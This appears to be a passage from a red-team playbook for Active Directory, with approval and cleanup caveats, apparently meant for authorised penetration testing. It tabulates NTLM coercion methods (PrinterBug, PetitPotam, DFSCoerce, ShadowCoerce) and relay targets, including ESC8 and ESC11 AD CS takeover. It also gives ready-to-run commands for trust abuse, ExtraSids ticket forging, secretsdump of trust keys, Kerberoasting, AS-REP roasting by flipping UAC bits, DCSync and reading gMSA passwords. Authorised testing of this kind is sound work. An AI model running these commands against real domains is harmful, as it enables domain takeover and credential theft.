Base refs already carry printerbug/petitpotam/coercer + ntlmrelayx one-liners; this adds the method matrix, the
two missing coercers, and the relay-target decision matrix. Never coerce prod DCs recklessly (auth storms).

Coercion method matrix (force a target to authenticate to your listener):

| Method | Protocol / pipe | Trigger function(s) | Tool |
|---|---|---|---|
| PrinterBug   | MS-RPRN  \pipe\spoolss      | RpcRemoteFindFirstPrinterChangeNotification(Ex) | printerbug.py / SpoolSample |
| PetitPotam   | MS-EFSR  \pipe\efsrpc       | EfsRpcOpenFileRaw / … (some opnums pre-auth, pre-patch) | petitpotam.py |
| DFSCoerce    | MS-DFSNM \pipe\netdfs       | NetrDfsAddStdRoot / NetrDfsRemoveStdRoot | dfscoerce.py |
| ShadowCoerce | MS-FSRVP \pipe\FssagentRpc  | IsPathSupported / IsPathShadowCopied | shadowcoerce.py |
| (all, incl MS-PAR/MS-EVEN) | multi         | enumerate reachable methods | coercer.py coerce -t <t> -l <ip> -u <u> -p <p> |

Relay-target decision matrix (where the coerced auth lands):

| Relay to | Precondition | Outcome |
|---|---|---|
| ldaps://<dc> | LDAP signing / channel-binding NOT enforced | add computer / shadow-cred / RBCD / ACL escalate (`--escalate-user`, `--shadow-credentials`, `--delegate-access`) |
| smb://<t>    | SMB signing NOT required (`--gen-relay-list`) | exec on a second host (`-socks` for sessions) |
| http://<ca>/certsrv | web-enroll + machine template | ESC8 — cert for the relayed machine/DC (`--adcs`) |
| rpc://<ca>   | ICPR not enforcing encryption (ESC11) | cert via RPC, no web endpoint (`-rpc-mode ICPR`) |
```
#   A machine/DC acct can't be relayed back to ITSELF (same-host NTLM reflection is blocked) -> relay to a
#   DIFFERENT DC or to AD CS. Coerce DC$ -> relay to AD CS web-enroll (ESC8) is the classic no-cred takeover vector.
#   Kerberos relay (krbrelayx) where NTLM is disabled -> cross-ref lateral ref; APPROVAL-GATED.
```

---

## Extended arsenal — Trust abuse (intra-forest child→parent / inter-forest)   (FEASIBILITY-ONLY, APPROVAL-GATED)
Note: Cleanup contract applies. Forge for a TEST SID and PROVE the filtering gap — never traverse a prod trust or
operate a real child→parent hop. The inter-realm referral-TGT forge (ticketer -extra-sid) is in the Kerberos arsenal.
```
# Enumerate trusts + direction / transitivity
nltest /domain_trusts /all_trusts          Get-DomainTrust            Get-ADTrust -Filter *
ldeep ldap -u <u> -p <p> -d <d> -s ldap://<dc> trusts
#   BloodHound: the TrustedBy edge + "Map Domain Trusts". Classify intra-forest (parent/child, tree-root) vs
#   external vs forest; record the SID-filtering / selective-auth posture per trust.
```
| Trust | SID filtering default | What stays abusable |
|---|---|---|
| Intra-forest (child↔parent) | NOT enforced | ExtraSids: forge an inter-realm TGT with `<parent>-519` (Enterprise Admins) → child→parent |
| External (domain↔domain) | Quarantine ON | high-RID ExtraSids filtered; foreign ACL/group memberships + cross-trust Kerberoast remain |
| Forest↔forest | ON (+ optional selective-auth) | same as external; TGT-delegation OFF by default blocks unconstrained-capture across it |
```
# Abuse that survives a FILTERED (inter-forest) trust — normal creds, no forging:
lookupsid.py '<d>/<u>:<p>'@<trusted_dc>                                 # map foreign SIDs / FSPs
Get-DomainForeignGroupMember -Domain <trusted_d>                        # who in MY domain holds rights THERE
GetUserSPNs.py -target-domain <trusted_d> -request '<d>/<u>:<p>' -dc-ip <dc>   # cross-trust Kerberoast (crack OFFLINE)
#   unconstrained-deleg + coercion across a trust works ONLY where TGT delegation is enabled (rare inter-forest).
# Trust-key route (CAPABILITY-ONLY): dump the TDO trust key, forge a referral TGT for a TEST SID
secretsdump.py -just-dc-user '<d>\<trusted_d>$' '<d>/<u>:<p>'@<dc>      # SINGLE trust account (not the domain)
#   -> feed the key to the inter-realm ticketer line (Kerberos arsenal); demonstrate, never traverse.
```

---

## Extended arsenal — ACL edges (additional)   (exercise ONE edge on a TEST principal, then REVERT)
Note: Cleanup contract applies — record originals, revert every UAC bit / attribute / ACE / membership; crack any
roast OFFLINE. These are the edges NOT covered in the base/extended ACL blocks above.
```
# Targeted AS-REP roasting — GenericWrite / WriteAccountRestrictions lets you flip userAccountControl on a victim
Set-DomainObject -Identity <victim> -XOR @{useraccountcontrol=4194304}          # SET DONT_REQ_PREAUTH (0x400000)
bloodyAD -d <d> -u <u> -p <p> --host <dc> add uac <victim> -f DONT_REQ_PREAUTH  # same, cross-platform
#   -> AS-REP roast <victim> (base kerberos, hashcat -m 18200), crack OFFLINE, then CLEAR the bit (REVERT):
bloodyAD -d <d> -u <u> -p <p> --host <dc> remove uac <victim> -f DONT_REQ_PREAUTH
#   only toggle DONT_REQ_PREAUTH and revert immediately; do not leave the account pre-auth-disabled.

# AllExtendedRights maps to a known primitive, not a new action:
#   on a USER          -> User-Force-Change-Password  = ForceChangePassword (base/extended ACL blocks)
#   on the DOMAIN head -> DS-Replication-Get-Changes[-All] = DCSync   (SINGLE test account, APPROVAL-GATED)

# ReadGMSAPassword edge — if the gMSA's PrincipalsAllowedToRetrieveManagedPassword resolves to a group you can
#   write, ADD yourself (AddSelf/AddMember, base ACL), read, then REMOVE yourself (REVERT):
#     add self -> gMSADumper.py / nxc ldap --gmsa (base ACL) -> managed blob -> NT (redact to fp) -> remove self.

# WriteSPN (WriteProperty on servicePrincipalName) = targetedKerberoast (base ACL): set temp SPN -> roast -> REMOVE SPN.
# Owns == WriteOwner -> the take-ownership chain (ACL extended). AddKeyCredentialLink == shadow-cred (base ACL).
```
